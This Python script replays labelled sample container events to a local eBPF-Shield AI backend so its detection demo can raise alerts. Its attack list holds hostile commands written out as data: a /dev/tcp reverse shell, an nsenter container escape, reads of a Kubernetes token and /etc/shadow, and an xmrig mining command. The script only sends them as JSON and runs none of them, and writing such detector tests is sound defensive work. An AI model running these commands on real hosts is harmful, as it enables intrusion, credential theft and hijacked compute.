"""
replay.py — Event replay script for eBPF-Shield AI demo.
Owner: Arpit Sharma (ML / security)

Sends realistic sample events to the backend API.
Mix of normal container activity and attack scenarios.
All events are clearly labeled as source="replay".

Usage:
    python3 replay.py              # Run full demo sequence
    python3 replay.py --fast       # Run without delays
    python3 replay.py --attack     # Only attack events
"""

import httpx
import time
import sys
import random

API_URL = "http://localhost:8000/api/v1/events/batch"


# ──────────────────────────────────────────────
# Sample events — realistic container scenarios
# ──────────────────────────────────────────────

NORMAL_EVENTS = [
    {
        "event_type": "process_exec",
        "pid": 1234, "ppid": 1,
        "executable": "/usr/sbin/nginx",
        "args": "nginx: worker process",
        "uid": 33,
        "container_id": "a1b2c3d4e5f6",
        "pod_name": "web-frontend-7d9f8b6c4-x2k5m",
        "namespace": "production",
        "node_name": "node-01",
        "image": "nginx:1.25-alpine",
        "source": "replay",
    },
    {
        "event_type": "file_open",
        "pid": 1235, "ppid": 1234,
        "executable": "/usr/sbin/nginx",
        "args": "/etc/nginx/nginx.conf",
        "uid": 33,
        "container_id": "a1b2c3d4e5f6",
        "pod_name": "web-frontend-7d9f8b6c4-x2k5m",
        "namespace": "production",
        "node_name": "node-01",
        "image": "nginx:1.25-alpine",
        "source": "replay",
    },
    {
        "event_type": "net_connect",
        "pid": 2001, "ppid": 1,
        "executable": "/usr/bin/python3",
        "args": "connect 10.96.0.1:443",
        "uid": 1000,
        "container_id": "b2c3d4e5f6a1",
        "pod_name": "api-server-5c8d7e6f3-m9n2p",
        "namespace": "production",
        "node_name": "node-01",
        "image": "python:3.12-slim",
        "source": "replay",
    },
    {
        "event_type": "process_exec",
        "pid": 3001, "ppid": 1,
        "executable": "/usr/local/bin/node",
        "args": "node server.js",
        "uid": 1000,
        "container_id": "c3d4e5f6a1b2",
        "pod_name": "payment-svc-4b7c8d9e2-k3l5n",
        "namespace": "production",
        "node_name": "node-02",
        "image": "node:20-alpine",
        "source": "replay",
    },
    {
        "event_type": "file_open",
        "pid": 3002, "ppid": 3001,
        "executable": "/usr/local/bin/node",
        "args": "/app/config/database.json",
        "uid": 1000,
        "container_id": "c3d4e5f6a1b2",
        "pod_name": "payment-svc-4b7c8d9e2-k3l5n",
        "namespace": "production",
        "node_name": "node-02",
        "image": "node:20-alpine",
        "source": "replay",
    },
    {
        "event_type": "net_connect",
        "pid": 3003, "ppid": 3001,
        "executable": "/usr/local/bin/node",
        "args": "connect 10.96.5.10:5432",
        "uid": 1000,
        "container_id": "c3d4e5f6a1b2",
        "pod_name": "payment-svc-4b7c8d9e2-k3l5n",
        "namespace": "production",
        "node_name": "node-02",
        "image": "node:20-alpine",
        "source": "replay",
    },
    {
        "event_type": "process_exec",
        "pid": 4001, "ppid": 1,
        "executable": "/usr/bin/redis-server",
        "args": "redis-server *:6379",
        "uid": 999,
        "container_id": "d4e5f6a1b2c3",
        "pod_name": "cache-redis-0",
        "namespace": "production",
        "node_name": "node-02",
        "image": "redis:7-alpine",
        "source": "replay",
    },
]

ATTACK_EVENTS = [
    # Attack 1: Container escape attempt via nsenter
    {
        "event_type": "process_exec",
        "pid": 6661, "ppid": 1,
        "executable": "/usr/bin/nsenter",
        "args": "nsenter --target 1 --mount --uts --ipc --net --pid",
        "uid": 0,
        "container_id": "e5f6a1b2c3d4",
        "pod_name": "compromised-app-8f7e6d5c4-q1w2e",
        "namespace": "staging",
        "node_name": "node-01",
        "image": "vulnerable-app:latest",
        "source": "replay",
    },
    # Attack 2: Reading sensitive credentials
    {
        "event_type": "file_open",
        "pid": 6662, "ppid": 6661,
        "executable": "/bin/cat",
        "args": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        "uid": 0,
        "container_id": "e5f6a1b2c3d4",
        "pod_name": "compromised-app-8f7e6d5c4-q1w2e",
        "namespace": "staging",
        "node_name": "node-01",
        "image": "vulnerable-app:latest",
        "source": "replay",
    },
    # Attack 3: Reverse shell
    {
        "event_type": "process_exec",
        "pid": 6663, "ppid": 6661,
        "executable": "/bin/bash",
        "args": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1",
        "uid": 0,
        "container_id": "e5f6a1b2c3d4",
        "pod_name": "compromised-app-8f7e6d5c4-q1w2e",
        "namespace": "staging",
        "node_name": "node-01",
        "image": "vulnerable-app:latest",
        "source": "replay",
    },
    # Attack 4: Crypto mining
    {
        "event_type": "process_exec",
        "pid": 7771, "ppid": 1,
        "executable": "/tmp/xmrig",
        "args": "xmrig --donate-level 1 -o stratum+tcp://pool.mining.com:3333 -u wallet123",
        "uid": 0,
        "container_id": "f6a1b2c3d4e5",
        "pod_name": "data-processor-3a4b5c6d7-r8s9t",
        "namespace": "batch",
        "node_name": "node-03",
        "image": "data-processor:v2.1",
        "source": "replay",
    },
    # Attack 5: Suspicious network connection to C2
    {
        "event_type": "net_connect",
        "pid": 7772, "ppid": 7771,
        "executable": "/tmp/xmrig",
        "args": "connect 185.220.101.42:4444",
        "uid": 0,
        "container_id": "f6a1b2c3d4e5",
        "pod_name": "data-processor-3a4b5c6d7-r8s9t",
        "namespace": "batch",
        "node_name": "node-03",
        "image": "data-processor:v2.1",
        "source": "replay",
    },
    # Attack 6: Reconnaissance
    {
        "event_type": "process_exec",
        "pid": 8881, "ppid": 1,
        "executable": "/usr/bin/nmap",
        "args": "nmap -sS 10.96.0.0/16",
        "uid": 0,
        "container_id": "a1b2c3d4e5f6",
        "pod_name": "web-frontend-7d9f8b6c4-x2k5m",
        "namespace": "production",
        "node_name": "node-01",
        "image": "nginx:1.25-alpine",
        "source": "replay",
    },
    # Attack 7: Privilege escalation
    {
        "event_type": "process_exec",
        "pid": 8882, "ppid": 8881,
        "executable": "/usr/bin/sudo",
        "args": "sudo -i",
        "uid": 1000,
        "container_id": "a1b2c3d4e5f6",
        "pod_name": "web-frontend-7d9f8b6c4-x2k5m",
        "namespace": "production",
        "node_name": "node-01",
        "image": "nginx:1.25-alpine",
        "source": "replay",
    },
    # Attack 8: Reading /etc/shadow
    {
        "event_type": "file_open",
        "pid": 8883, "ppid": 8882,
        "executable": "/bin/cat",
        "args": "cat /etc/shadow",
        "uid": 0,
        "container_id": "a1b2c3d4e5f6",
        "pod_name": "web-frontend-7d9f8b6c4-x2k5m",
        "namespace": "production",
        "node_name": "node-01",
        "image": "nginx:1.25-alpine",
        "source": "replay",
    },
]


def send_events(events: list, delay: float = 0.0):
    """Send events to the backend API."""
    with httpx.Client(timeout=10) as client:
        for ev in events:
            try:
                resp = client.post(API_URL, json={"events": [ev]})
                data = resp.json()
                status = "🚨 ALERT" if data.get("alerts_created", 0) > 0 else "✅ OK"
                print(f"  {status}  {ev['event_type']:14s}  {ev['executable']:30s}  pod={ev['pod_name'][:35]}")
                if data.get("alerts_created", 0) > 0:
                    print(f"         ↳ Alert created: {data['alert_ids']}")
            except Exception as e:
                print(f"  ❌ Error: {e}")

            if delay > 0:
                time.sleep(delay)


def run_demo(fast: bool = False, attack_only: bool = False):
    """Run the complete demo replay sequence."""
    delay = 0.0 if fast else 1.5

    print("=" * 70)
    print("  eBPF-Shield AI — Event Replay Demo")
    print("  ⚠️  All events are REPLAYED samples, not live kernel monitoring")
    print("=" * 70)

    if not attack_only:
        print(f"\n{'─' * 70}")
        print("  Phase 1: Normal container activity")
        print(f"{'─' * 70}")
        send_events(NORMAL_EVENTS, delay)

        if not fast:
            print("\n  ⏳ Pausing before attack simulation...\n")
            time.sleep(2)

    print(f"\n{'─' * 70}")
    print("  Phase 2: Attack scenario replay")
    print(f"{'─' * 70}")
    send_events(ATTACK_EVENTS, delay)

    print(f"\n{'─' * 70}")
    print("  ✅ Replay complete!")
    print(f"  📊 View dashboard: http://localhost:8000")
    print(f"{'─' * 70}\n")


def trigger_single_alert():
    """Trigger one normal event followed by one container escape alert for concise mentor demo."""
    print("=" * 70)
    print("  eBPF-Shield AI — Single Alert Trigger Demo")
    print("  ⚠️  REPLAY sample: Normal Event -> Container Escape via nsenter")
    print("=" * 70)
    print("\n1. Sending normal web traffic event (nginx worker)...")
    send_events([NORMAL_EVENTS[0]], delay=0.5)
    print("\n2. Sending suspicious container escape event (nsenter)...")
    send_events([ATTACK_EVENTS[0]], delay=0.5)
    print("\n✅ Trigger complete! Check dashboard at http://localhost:8000 for the Critical Alert.")


if __name__ == "__main__":
    if "--single" in sys.argv:
        trigger_single_alert()
    else:
        fast = "--fast" in sys.argv
        attack_only = "--attack" in sys.argv
        run_demo(fast=fast, attack_only=attack_only)

